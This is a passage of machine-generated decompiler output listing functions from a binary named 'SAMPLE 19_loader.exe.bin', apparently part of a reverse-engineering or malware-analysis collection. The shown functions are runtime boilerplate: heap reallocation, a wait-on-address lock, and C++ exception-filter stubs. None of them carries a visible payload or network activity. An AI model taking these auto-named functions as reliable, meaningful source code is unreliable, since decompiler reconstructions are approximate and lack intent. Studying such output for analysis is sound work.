                  LPVOID param_5,ulonglong param_6)

{
  undefined1 auVar1 [16];
  undefined1 auVar2 [16];
  ulonglong dwBytes;
  LPVOID *ppvVar3;
  HANDLE hHeap;
  ulonglong uVar4;
  LPVOID pvVar5;
  LPVOID local_30;
  LPVOID local_28;
  
  auVar1._8_8_ = 0;
  auVar1._0_8_ = param_6;
  auVar2._8_8_ = 0;
  auVar2._0_8_ = param_4;
  dwBytes = SUB168(auVar1 * auVar2,0);
  if (0x8000000000000000U - (longlong)param_5 < dwBytes || SUB168(auVar1 * auVar2,8) != 0) {
    param_1[1] = 0;
    uVar4 = 1;
  }
  else {
    if (param_3 == 0) {
      ppvVar3 = &local_30;
      pvVar5 = (LPVOID)0x0;
    }
    else {
      pvVar5 = (LPVOID)(param_3 * param_6);
      local_30 = param_5;
      ppvVar3 = &local_28;
    }
    *ppvVar3 = pvVar5;
    if ((local_30 == (LPVOID)0x0) || (local_28 == (LPVOID)0x0)) {
      if (dwBytes == 0) {
        pvVar5 = param_5;
      }
      else {
        pvVar5 = FUN_14000fc7a(0,dwBytes);
      }
    }
    else {
      hHeap = GetProcessHeap();
      pvVar5 = HeapReAlloc(hHeap,0,param_2,dwBytes);
    }
    if (pvVar5 != (LPVOID)0x0) {
      param_5 = pvVar5;
    }
    uVar4 = (ulonglong)(pvVar5 == (LPVOID)0x0);
    param_1[1] = (ulonglong)param_5;
  }
  param_1[2] = dwBytes;
  *param_1 = uVar4;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x22dc8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140022dc8 rva=0x22dc8 */

void FUN_140022dc8(uint *param_1,char param_2,undefined8 param_3,longlong param_4)

{
  code *pcVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  bool bVar7;
  uint local_34;
  uint local_30;
  undefined1 local_2c;
  
  uVar4 = *param_1;
  uVar5 = uVar4 & 4;
  uVar6 = uVar4 & 3;
  switch(uVar6) {
  case 0:
switchD_140022df9_caseD_0:
    return;
  case 2:
    goto switchD_140022df9_caseD_2;
  case 3:
    goto switchD_140022df9_caseD_3;
  }
switchD_140022df9_caseD_1:
  do {
    if (uVar5 == 0) {
      uVar4 = uVar4 | 4;
      uVar2 = 1;
      LOCK();
      uVar5 = *param_1;
      if (uVar5 == 1) {
        *param_1 = uVar4;
      }
      else {
        uVar2 = uVar5;
      }
      UNLOCK();
      if (uVar5 != 1) goto LAB_140022e73;
    }
    local_34 = uVar4;
    iVar3 = WaitOnAddress(param_1,&local_34,4,0xffffffff);
    if (iVar3 != 1) {
      GetLastError();
      uVar4 = *param_1;
      uVar5 = uVar4 & 4;
      uVar6 = uVar4 & 3;
      switch(uVar6) {
      case 0:
        goto switchD_140022df9_caseD_0;
      case 2:
        goto switchD_140022df9_caseD_2;
      case 3:
        goto switchD_140022df9_caseD_3;
      }
      goto switchD_140022df9_caseD_1;
    }
    uVar4 = *param_1;
    uVar5 = uVar4 & 4;
    uVar6 = uVar4 & 3;
    switch(uVar6) {
    case 0:
      goto switchD_140022df9_caseD_0;
    case 2:
switchD_140022df9_caseD_2:
      if (param_2 == '\0') {
                    /* WARNING: Does not return */
        pcVar1 = (code *)invalidInstructionException();
        (*pcVar1)();
      }
switchD_140022df9_caseD_3:
      do {
        LOCK();
        uVar2 = *param_1;
        bVar7 = uVar4 == uVar2;
        if (bVar7) {
          *param_1 = uVar5 + 1;
        }
        else {
          uVar4 = uVar2;
        }
        UNLOCK();
        uVar2 = uVar4;
        if (bVar7) {
          local_2c = uVar6 == 2;
          local_30 = 0;
          (**(code **)(param_4 + 0x20))(param_3,&local_30);
          LOCK();
          uVar4 = *param_1;
          *param_1 = local_30;
          UNLOCK();
          if ((uVar4 & 4) == 0) {
            return;
          }
          WakeByAddressAll(param_1);
          return;
        }
LAB_140022e73:
        uVar4 = uVar2;
        uVar5 = uVar4 & 4;
        uVar6 = uVar4 & 3;
        switch(uVar6) {
        case 0:
          goto switchD_140022df9_caseD_0;
        case 1:
          goto switchD_140022df9_caseD_1;
        case 2:
          goto switchD_140022df9_caseD_2;
        }
      } while( true );
    case 3:
      goto switchD_140022df9_caseD_3;
    }
  } while( true );
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x22ed0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140022ed0 rva=0x22ed0 */

void FUN_140022ed0(undefined8 *param_1)

{
  FUN_140015d60(*(int *)*param_1,param_1);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x22ef0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140022ef0 rva=0x22ef0 */

bool FUN_140022ef0(undefined8 *param_1)

{
  return *(int *)*param_1 == -0x3ffffffb;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x22f10 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140022f10 rva=0x22f10 */

undefined4 FUN_140022f10(undefined8 param_1,longlong param_2)

{
  undefined8 uVar1;
  PVOID pvVar2;
  
  *(undefined8 *)(param_2 + 0x30) = param_1;
  if ((((*(char *)(param_2 + 0x58) != '\0') &&
       (*(undefined8 *)(param_2 + 0x28) = **(undefined8 **)(param_2 + 0x30),
       **(int **)(param_2 + 0x28) == -0x1f928c9d)) &&
      (*(int *)(*(longlong *)(param_2 + 0x28) + 0x18) == 4)) &&
     (((*(int *)(*(longlong *)(param_2 + 0x28) + 0x20) == 0x19930520 ||
       (*(int *)(*(longlong *)(param_2 + 0x28) + 0x20) == 0x19930521)) ||
      (*(int *)(*(longlong *)(param_2 + 0x28) + 0x20) == 0x19930522)))) {
    pvVar2 = FUN_1400161f0();
    *(undefined8 *)((longlong)pvVar2 + 0x20) = *(undefined8 *)(param_2 + 0x28);
    uVar1 = *(undefined8 *)(*(longlong *)(param_2 + 0x30) + 8);
    pvVar2 = FUN_1400161f0();
    *(undefined8 *)((longlong)pvVar2 + 0x28) = uVar1;
                    /* WARNING: Subroutine does not return */
    FUN_140015f5c();
  }
  *(undefined4 *)(param_2 + 0x20) = 0;
  return *(undefined4 *)(param_2 + 0x20);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x22fa2 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140022fa2 rva=0x22fa2 */

void FUN_140022fa2(undefined8 param_1,longlong param_2)

{
  FUN_140016ad0(**(int **)(param_2 + 0x48));
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x22fbc | no_partial_markers_not_a_CFG_proof ===== */
/* address=140022fbc rva=0x22fbc */

undefined4 FUN_140022fbc(undefined8 *param_1,longlong param_2)

{
  int iVar1;
  
  *(undefined8 **)(param_2 + 0x28) = param_1;
  iVar1 = *(int *)*param_1;
  *(int *)(param_2 + 0x24) = iVar1;
  *(uint *)(param_2 + 0x20) = (uint)(iVar1 == -0x1f928c9d);
  return *(undefined4 *)(param_2 + 0x20);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x22fe9 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140022fe9 rva=0x22fe9 */

void FUN_140022fe9(undefined8 param_1,longlong param_2)

{
  FUN_140016ad0(**(int **)(param_2 + 0x58));
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x23010 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140023010 rva=0x23010 */

bool FUN_140023010(undefined8 *param_1)

{
  return *(int *)*param_1 == -0x3ffffffb;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x23030 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140023030 rva=0x23030 */

void FUN_140023030(void)

{
  FUN_140016ad0(7);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x23049 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140023049 rva=0x23049 */

void FUN_140023049(undefined8 param_1,longlong param_2)

{
  FUN_140016ad0(**(int **)(param_2 + 0x68));
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x23063 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140023063 rva=0x23063 */

void FUN_140023063(void)

{
  FUN_140016ad0(5);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x23080 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140023080 rva=0x23080 */

void FUN_140023080(void)

{
  FUN_140016ad0(0);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x23096 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140023096 rva=0x23096 */

void FUN_140023096(void)

{
  FUN_140016ad0(0);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x230ac | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400230ac rva=0x230ac */

void FUN_1400230ac(undefined8 param_1,longlong param_2)

{
  if (*(char *)(param_2 + 0x70) != '\0') {
    FUN_140016ad0(3);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x230cd | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400230cd rva=0x230cd */

void FUN_1400230cd(undefined8 param_1,longlong param_2)

{
  FUN_140018c64(**(longlong **)(param_2 + 0x48));
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x230e8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400230e8 rva=0x230e8 */

void FUN_1400230e8(undefined8 param_1,longlong param_2)

{
  FUN_140016ad0(**(int **)(param_2 + 0x98));
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x23110 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140023110 rva=0x23110 */

undefined4 FUN_140023110(undefined8 param_1,longlong param_2)

{
  ulonglong *puVar1;
  ulonglong uVar2;
  undefined8 uVar3;
  PVOID pvVar4;
  
  *(undefined8 *)(param_2 + 0x48) = param_1;
  pvVar4 = FUN_1400161f0();
  *(undefined8 *)((longlong)pvVar4 + 0x70) = *(undefined8 *)(param_2 + 0x80);
  puVar1 = *(ulonglong **)(param_2 + 0x98);
  uVar2 = puVar1[1];
  pvVar4 = FUN_1400161f0();
  *(ulonglong *)((longlong)pvVar4 + 0x60) = uVar2;
  uVar3 = *(undefined8 *)(**(longlong **)(param_2 + 0x48) + 0x38);
  pvVar4 = FUN_1400161f0();
  *(undefined8 *)((longlong)pvVar4 + 0x68) = uVar3;
  FUN_14001e9f0((int *)**(undefined8 **)(param_2 + 0x48),*(longlong **)(param_2 + 0x88),
                *(ULONG_PTR *)(param_2 + 0x90),puVar1,*(uint **)(param_2 + 0xa0),0,0,1);
  pvVar4 = FUN_1400161f0();
  *(undefined8 *)((longlong)pvVar4 + 0x70) = 0;
  *(undefined4 *)(param_2 + 0x40) = 1;
  *(undefined4 *)(param_2 + 0x44) = 1;
  return *(undefined4 *)(param_2 + 0x44);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x231bd | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400231bd rva=0x231bd */

void FUN_1400231bd(void)

{
  FUN_140016ad0(4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x231d6 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400231d6 rva=0x231d6 */

void FUN_1400231d6(undefined8 param_1,longlong param_2)

{
  FUN_14001ba1c(**(uint **)(param_2 + 0x48));
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x231f0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400231f0 rva=0x231f0 */

void FUN_1400231f0(undefined8 param_1,longlong param_2)

{
  FUN_14001ba1c(*(uint *)(param_2 + 0x60));
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x23207 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140023207 rva=0x23207 */

void FUN_140023207(void)

{
  FUN_140016ad0(8);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x23220 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140023220 rva=0x23220 */

void FUN_140023220(undefined8 *param_1,longlong param_2)

{
  FUN_14001e7c0(param_1,*(longlong *)(param_2 + 0xd8),(undefined4 *)(param_2 + 0x20));
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x23241 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140023241 rva=0x23241 */

void FUN_140023241(undefined8 param_1,longlong param_2)

{
  int *piVar1;
  undefined8 uVar2;
  PVOID pvVar3;
  
  FUN_140019580(*(longlong *)(param_2 + 0x30));
  if ((((*(int *)(param_2 + 0x20) == 0) &&
       (piVar1 = *(int **)(param_2 + 0xd8), *piVar1 == -0x1f928c9d)) && (piVar1[6] == 4)) &&
     (((piVar1[8] == 0x19930520 || (piVar1[8] == 0x19930521)) || (piVar1[8] == 0x19930522)))) {
    uVar2 = FUN_1400149f0(*(longlong *)(piVar1 + 10));
    if ((int)uVar2 != 0) {
      FUN_140014960(piVar1);
    }
  }
  pvVar3 = FUN_1400161f0();
  *(undefined8 *)((longlong)pvVar3 + 0x20) = *(undefined8 *)(param_2 + 0x70);
  pvVar3 = FUN_1400161f0();
  *(undefined8 *)((longlong)pvVar3 + 0x28) = *(undefined8 *)(param_2 + 0x78);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x232d0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400232d0 rva=0x232d0 */

void FUN_1400232d0(undefined8 *param_1)

{
  FUN_140014aa0(param_1);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x232e6 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400232e6 rva=0x232e6 */

void FUN_1400232e6(void)

{
  PVOID pvVar1;
  
  pvVar1 = FUN_1400161f0();
  if (0 < *(int *)((longlong)pvVar1 + 0x30)) {
    pvVar1 = FUN_1400161f0();
    *(int *)((longlong)pvVar1 + 0x30) = *(int *)((longlong)pvVar1 + 0x30) + -1;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x23309 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140023309 rva=0x23309 */

void FUN_140023309(undefined8 param_1,longlong param_2)

{
  FUN_140018c64(*(longlong *)(param_2 + 0x40));
  return;
}


